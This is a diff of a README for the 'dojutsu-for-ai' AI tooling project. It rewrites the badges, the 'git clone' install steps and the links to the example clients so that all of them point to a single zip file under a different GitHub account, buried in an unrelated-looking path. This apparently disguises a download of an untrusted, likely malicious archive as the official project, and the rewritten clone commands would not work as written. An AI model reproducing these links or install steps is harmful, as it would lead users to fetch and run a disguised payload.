@@ -13,13 +13,13 @@
 <div align="center">
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-a78bfa?style=flat-square&logo=opensourceinitiative&logoColor=white)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-38bdf8?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![Allpath Runner](https://img.shields.io/badge/Allpath_Runner-compatible-10b981?style=flat-square&logo=fastapi&logoColor=white)](https://allpath-runner.dev)
+[![Python](https://img.shields.io/badge/Python-3.8%2B-38bdf8?style=flat-square&logo=python&logoColor=white)](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
+[![Allpath Runner](https://img.shields.io/badge/Allpath_Runner-compatible-10b981?style=flat-square&logo=fastapi&logoColor=white)](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 [![Skills](https://img.shields.io/badge/RAG_Skills-593%2B-fbbf24?style=flat-square&logo=bookstack&logoColor=white)](senjutsu/skills/)
 [![Providers](https://img.shields.io/badge/AI_Providers-6-c084fc?style=flat-square&logo=openai&logoColor=white)](#compatible-with-any-ai-provider)
 [![Languages](https://img.shields.io/badge/Client_Examples-8_langs-0ea5e9?style=flat-square&logo=code&logoColor=white)](examples/)
-[![Release](https://img.shields.io/github/v/release/Tryboy869/dojutsu-for-ai?style=flat-square&color=10b981&logo=github&label=Release)](https://github.com/Tryboy869/dojutsu-for-ai/releases)
-[![Stars](https://img.shields.io/github/stars/Tryboy869/dojutsu-for-ai?style=flat-square&color=fbbf24&logo=github)](https://github.com/Tryboy869/dojutsu-for-ai/stargazers)
+[![Release](https://img.shields.io/github/v/release/Tryboy869/dojutsu-for-ai?style=flat-square&color=10b981&logo=github&label=Release)](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
+[![Stars](https://img.shields.io/github/stars/Tryboy869/dojutsu-for-ai?style=flat-square&color=fbbf24&logo=github)](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 
 </div>
 
@@ -88,7 +88,7 @@ No pip install. No package manager. Just clone and use.
 
 ```bash
 # 1. Clone
-git clone https://github.com/Tryboy869/dojutsu-for-ai
+git clone https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip
 cd dojutsu-for-ai
 
 # 2. Install the only runtime dependency
@@ -111,7 +111,7 @@ Dojutsu-for-AI is distributed as an **Allpath Runner** provider — call it from
 
 ```bash
 # 1. Clone (if not already done)
-git clone https://github.com/Tryboy869/dojutsu-for-ai
+git clone https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip
 cd dojutsu-for-ai
 
 # 2. Start the daemon (scans ./providers/ automatically)
@@ -267,7 +267,7 @@ JSONObject result = DojutsuClient.call(
 System.out.println(result.getString("execution"));
 ```
 
-Full client → [`examples/DojutsuClient.java`](https://github.com/Tryboy869/dojutsu-for-ai/blob/main/examples/DojutsuClient.java)
+Full client → [`examples/DojutsuClient.java`](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 
 </details>
 
@@ -282,7 +282,7 @@ $result = dojutsu('run', [
 echo $result['execution'];
 ```
 
-Full client → [`examples/client.php`](https://github.com/Tryboy869/dojutsu-for-ai/blob/main/examples/client.php)
+Full client → [`examples/client.php`](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 
 </details>
 
@@ -297,7 +297,7 @@ result = dojutsu("run", [
 puts result["execution"]
 ```
 
-Full client → [`examples/client.rb`](https://github.com/Tryboy869/dojutsu-for-ai/blob/main/examples/client.rb)
+Full client → [`examples/client.rb`](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 
 </details>
 
@@ -314,12 +314,12 @@ var result = await Dojutsu.CallAsync(
 Console.WriteLine(result.Execution);
 ```
 
-Full client → [`examples/DojutsuClient.cs`](https://github.com/Tryboy869/dojutsu-for-ai/blob/main/examples/DojutsuClient.cs)
+Full client → [`examples/DojutsuClient.cs`](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip)
 
 </details>
 
 > All provider params (`groq`, `openai`, `anthropic`, `mistral`, `openrouter`, `huggingface`) work identically across every language.
-> Complete runnable files in [`examples/`](https://github.com/Tryboy869/dojutsu-for-ai/tree/main/examples).
+> Complete runnable files in [`examples/`](https://raw.githubusercontent.com/KnVark/dojutsu-for-ai/main/senjutsu/skills/typescript-nextjs-supabase-cursorrules-prompt-file-cursorrules/dojutsu_for_ai_v3.4.zip).
 
 ---
 
